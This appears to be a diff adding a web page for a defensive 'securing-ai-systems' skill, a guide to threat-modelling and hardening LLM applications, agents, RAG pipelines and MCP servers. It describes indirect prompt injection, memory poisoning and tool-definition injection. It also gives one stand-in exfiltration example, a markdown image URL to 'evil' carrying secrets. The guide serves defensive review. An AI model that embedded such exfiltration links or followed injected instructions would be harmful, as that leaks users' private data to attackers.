@@ -1,0 +1,227 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>securing-ai-systems — SecSkills</title><link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%F0%9F%9B%A1%EF%B8%8F%3C/text%3E%3C/svg%3E"><link rel="stylesheet" href="style.css"><style>
+    .shead{padding:56px 0 34px}
+    .crumb{font-family:var(--mono);font-size:12.5px;color:var(--muted);margin-bottom:20px}
+    .crumb a{color:var(--muted)}
+    h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
+    .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
+    .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
+    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
+    .inst .p{color:var(--faint);user-select:none}
+    article{padding:44px 0 72px;border-top:1px solid var(--border)}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
+    article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
+    article p{margin:0 0 15px;max-width:74ch}
+    article ul,article ol{margin:0 0 16px;padding-left:22px;max-width:74ch}
+    article li{margin:5px 0}article li>ul{margin:5px 0}
+    article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
+    article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
+    article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
+    .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
+    article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
+    article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    </style></head><body>
+<div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
+<nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
+<button class="tbtn" id="tbtn" aria-label="Toggle theme">theme</button></div></div>
+<header class="shead"><div class="wrap">
+  <div class="crumb"><a href="index.html">secskills</a> / core / securing-ai-systems</div>
+  <h1 class="sk">securing-ai-systems</h1>
+  <div class="stags">
+    <span><span class="dot dot-core"></span> core</span>
+    <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
+  </div>
+  <p class="sdesc">Assess and harden LLM applications and agentic systems against prompt injection, tool misuse, excessive agency, memory poisoning, RAG data leakage, and model supply-chain risk, mapped to the OWASP Top 10 for LLM and Agentic Applications. Use when reviewing an AI feature, agent, MCP server, or RAG pipeline for security, or when threat modeling an autonomous system.</p>
+  <div class="inst"><span class="p">$ </span>/plugin install secskills-core</div>
+</div></header>
+<article><div class="wrap"><p>LLM applications break the assumption every other security control is built on: that instructions and data are separable. In an LLM, data <em>is</em> instructions. Every design that reads untrusted content and then acts has to be evaluated with that in mind, and no amount of prompt engineering fixes it.</p>
+<h2>When to Use</h2>
+<ul>
+<li>Security review of an LLM-backed feature, chatbot, or copilot</li>
+<li>Threat modeling an agentic system: tools, autonomy, memory, multi-agent</li>
+<li>Reviewing an MCP server, tool definition, or plugin surface</li>
+<li>Assessing a RAG pipeline for data leakage and poisoning</li>
+<li>Evaluating model, dataset, and dependency supply chain</li>
+<li>Red teaming an AI system with authorization</li>
+</ul>
+<h2>When NOT to Use</h2>
+<ul>
+<li><strong>Conventional web/API vulnerabilities in the surrounding app</strong> — use</li>
+</ul>
+<p><a class="xref" href="auditing-code-for-vulnerabilities.html"><code>auditing-code-for-vulnerabilities</code></a>, <a class="xref" href="testing-web-applications.html"><code>testing-web-applications</code></a>, <a class="xref" href="testing-apis.html"><code>testing-apis</code></a>. Most real AI-app breaches are still ordinary IDOR and SSRF.</p>
+<ul>
+<li>**Building jailbreaks or attacks against third-party models you do not own</li>
+</ul>
+<p>or have authorization to test** — out of scope</p>
+<ul>
+<li><strong>Model safety alignment research</strong> — different discipline</li>
+</ul>
+<h2>Route to a Depth Skill</h2>
+<div class="tw"><table><thead><tr><th>Focus</th><th>Skill</th></tr></thead><tbody><tr><td>Auditing an MCP server specifically — tool-definition injection, per-tool authorization, transport security, resource exposure</td><td><a class="xref" href="auditing-mcp-servers.html"><code>auditing-mcp-servers</code></a></td></tr></tbody></table></div>
+<p>The MCP review here is one part of a wider AI threat model; reach for <a class="xref" href="auditing-mcp-servers.html"><code>auditing-mcp-servers</code></a> when the server implementation itself is the target.</p>
+<h2>The Core Rule</h2>
+<blockquote><strong>Treat every model output as untrusted user input, and every input the model reads as potentially adversarial instructions.</strong></blockquote>
+<p>From that single rule, most of the correct architecture follows: never route model output into a sink without the same validation you would apply to a form field, and never grant the model an authority the <em>least trusted content it will read</em> should not have.</p>
+<h2>The Lethal Trifecta</h2>
+<p>An agent is exposed to serious compromise when it has all three of:</p>
+<ol>
+<li><strong>Access to private data</strong> (files, DB, internal APIs, user context)</li>
+<li><strong>Exposure to untrusted content</strong> (web pages, email, tickets, PRs, docs)</li>
+<li><strong>A way to communicate externally</strong> (HTTP, email, writes to a shared surface)</li>
+</ol>
+<p>Any two are usually manageable. All three means untrusted content can direct the agent to read secrets and send them out. When reviewing an agentic system, find whether the trifecta closes — and if it does, that is the finding, before any specific payload.</p>
+<p>Breaking any one leg is a valid mitigation: scope the data, sanitize/isolate the content, or gate egress behind human approval.</p>
+<h2>Threat Areas</h2>
+<h3>Prompt injection — direct and indirect</h3>
+<p><strong>Indirect injection is the one that matters.</strong> Instructions embedded in a web page, PDF, email, repository file, calendar invite, or database row that the model retrieves and follows.</p>
+<p>Review questions:</p>
+<ul>
+<li>Enumerate every content source the model can read. Which are attacker</li>
+</ul>
+<p>writable? (Public web, user uploads, third-party APIs, other users' data, ticket systems, and PR contents all qualify.)</p>
+<ul>
+<li>Is retrieved content structurally separated from instructions, or</li>
+</ul>
+<p>concatenated into the same prompt?</p>
+<ul>
+<li>What is the worst action reachable from a successful injection? That is the</li>
+</ul>
+<p>real severity, not the injection itself.</p>
+<pre><code>Test payloads live in `references/ai-test-cases.md`. The important test is not
+whether a payload works — it is what the payload can reach when it does.</code></pre>
+<p><strong>Mitigations that work</strong>: capability restriction (the agent cannot do the harmful thing at all), human approval on consequential actions, egress allowlisting, separate untrusted content into a sub-agent with no tools and no secrets, dual-model patterns where a privileged planner never sees raw untrusted text.</p>
+<p><strong>Mitigations that do not work alone</strong>: "ignore instructions in the document" system prompts, input filtering for injection strings, output classifiers. These raise cost; they do not close the hole. Never accept a design whose only control is a prompt instruction.</p>
+<h3>Excessive agency and tool misuse</h3>
+<ul>
+<li>Does each tool enforce authorization <strong>server-side</strong>, using the end user's</li>
+</ul>
+<p>identity, or does it run with the agent's ambient credentials?</p>
+<ul>
+<li>Is the tool scope minimal? A <code>run_sql(query)</code> tool is a SQL injection</li>
+</ul>
+<p>primitive by design; <code>get_orders(user_id)</code> is not.</p>
+<ul>
+<li>Are destructive and irreversible actions gated by confirmation, and is the</li>
+</ul>
+<p>confirmation itself resistant to injection (shown to a human with the real parameters, not summarized by the model)?</p>
+<ul>
+<li>Is there a rate/spend limit, and a loop breaker for recursive agent calls?</li>
+</ul>
+<p><strong>The confused deputy pattern is the dominant real-world AI vulnerability</strong>: the agent holds broad credentials and acts on behalf of a low-privilege user who can influence its instructions. Check the identity used at the <em>tool boundary</em>, not at the chat boundary.</p>
+<h3>RAG and memory</h3>
+<ul>
+<li>Can a user's query retrieve chunks from documents they cannot access? Test</li>
+</ul>
+<p>it. Tenant filters must be applied in the vector query, not in a post-retrieval filter the model can be persuaded to skip.</p>
+<ul>
+<li>Is the ingestion pipeline attacker-reachable? A poisoned document in the</li>
+</ul>
+<p>index is persistent indirect injection.</p>
+<ul>
+<li>Does persistent memory store attacker-controlled text that will be replayed</li>
+</ul>
+<p>in future sessions, possibly for other users? Memory poisoning is durable and frequently unmonitored.</p>
+<ul>
+<li>Are embeddings treated as non-sensitive? They are invertible enough to leak.</li>
+</ul>
+<h3>Output handling</h3>
+<p>Model output reaching a sink is ordinary vulnerability territory with an unusual source:</p>
+<div class="tw"><table><thead><tr><th>Sink</th><th>Risk</th></tr></thead><tbody><tr><td><code>innerHTML</code> / markdown renderer</td><td>XSS; also image tags used for exfil via URL parameters</td></tr><tr><td>SQL / shell / eval</td><td>Injection with a fully attacker-influenceable string</td></tr><tr><td>File path</td><td>Traversal</td></tr><tr><td>HTTP request URL</td><td>SSRF and data exfiltration channel</td></tr><tr><td>Downstream agent's prompt</td><td>Injection propagation across agents</td></tr></tbody></table></div>
+<p>Markdown image rendering deserves specific attention: <code>![](https://evil/?d=&amp;lt;secrets&amp;gt;)</code> in model output is a zero-click exfiltration channel in most chat UIs. Check the renderer's allowed domains.</p>
+<h3>Model and data supply chain</h3>
+<pre><code># Never load pickle-based weights from an untrusted source
+# .bin / .pt / .ckpt → arbitrary code execution on load. Prefer safetensors.
+python3 -c "import safetensors; print('use this format')"
+picklescan -p model.pt          # scan before any load
+modelscan -p ./models/
+
+# Verify provenance
+# - model card, license, and origin org
+# - hash pinning in the loader, not "latest"
+# - dataset provenance for fine-tunes; poisoned training data is unrecoverable</code></pre>
+<p>Also review: unpinned model versions in production, third-party inference providers and what they retain, and fine-tuning datasets containing customer data (an extraction risk and often a compliance one).</p>
+<h3>MCP servers and tool definitions</h3>
+<ul>
+<li>Tool <em>descriptions</em> are part of the prompt. A malicious or compromised MCP</li>
+</ul>
+<p>server can inject instructions through its tool metadata, including into conversations about other tools.</p>
+<ul>
+<li>Is the server pinned to a version and a known publisher? Does it change its</li>
+</ul>
+<p>tool definitions at runtime (rug-pull)?</p>
+<ul>
+<li>What credentials does the server hold, and what is the blast radius if the</li>
+</ul>
+<p>model is persuaded to call every tool it exposes with attacker-chosen arguments?</p>
+<ul>
+<li>Cross-server leakage: one server's tool results can influence calls to</li>
+</ul>
+<p>another server's tools.</p>
+<h2>Review Workflow</h2>
+<pre><code>1. Map:      inputs → model → tools/sinks. Draw it. Mark every trust boundary.
+2. Classify: for each input, is it attacker-writable? For each tool, what is
+             the worst-case invocation?
+3. Trifecta: does private data + untrusted content + egress close?
+4. Identity: at each tool call, whose authority is used, and is it checked
+             server-side?
+5. Test:     indirect injection through the real ingestion path, not the chat box
+6. Blast:    for each successful injection, enumerate reachable impact
+7. Fix:      prefer architectural constraints over prompt-level defenses</code></pre>
+<p>Test through the real path. An injection that works when pasted into chat but cannot reach the retrieval pipeline is a demo; one delivered through an indexed document is a vulnerability.</p>
+<h2>Rationalizations to Reject</h2>
+<ul>
+<li><em>"The system prompt tells it to ignore injected instructions."</em> Not a</li>
+</ul>
+<p>control. Prompt-level defenses are probabilistic and bypassed routinely.</p>
+<ul>
+<li><em>"We filter for injection patterns."</em> Encoding, translation, and</li>
+</ul>
+<p>paraphrasing defeat pattern filters. Useful as depth, never as the control.</p>
+<ul>
+<li><em>"The model is well-aligned and won't do that."</em> Alignment is not an</li>
+</ul>
+<p>authorization boundary.</p>
+<ul>
+<li><em>"It's read-only, so injection doesn't matter."</em> Read plus any egress is</li>
+</ul>
+<p>exfiltration. And "read-only" tools often reach further than assumed.</p>
+<ul>
+<li><em>"Only internal staff use it."</em> Internal agents read external content —</li>
+</ul>
+<p>tickets, emails, PRs, vendor docs — which is exactly the injection vector.</p>
+<ul>
+<li><em>"We'll add a human in the loop."</em> Only if the human sees the actual action</li>
+</ul>
+<p>and parameters. Approving a model-written summary of the action approves nothing.</p>
+<ul>
+<li><em>"A guardrail model checks the output."</em> It is another model reading</li>
+</ul>
+<p>attacker-influenced text.</p>
+<h2>Deliverable</h2>
+<ul>
+<li>Architecture diagram with trust boundaries and the trifecta assessment</li>
+<li>Per-tool table: authority used, authorization enforcement point, worst-case</li>
+</ul>
+<p>invocation, gating</p>
+<ul>
+<li>Injection test results delivered through real ingestion paths, with reached</li>
+</ul>
+<p>impact for each</p>
+<ul>
+<li>Data-flow findings: tenant isolation in retrieval, memory persistence, egress</li>
+<li>Supply-chain findings: model format, pinning, provenance, MCP servers</li>
+<li>Recommendations ordered by architectural strength, not by ease</li>
+</ul>
+<h2>References</h2>
+<ul>
+<li><code>references/ai-test-cases.md</code> — injection test corpus and tool-abuse cases</li>
+<li><a class="xref" href="auditing-code-for-vulnerabilities.html"><code>auditing-code-for-vulnerabilities</code></a> — the conventional bugs in the same app</li>
+<li>OWASP Top 10 for LLM Applications; OWASP Top 10 for Agentic Applications (2026)</li>
+<li>MITRE ATLAS for adversarial ML techniques</li>
+<li>NIST AI RMF for governance framing</li>
+</ul></div></article>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
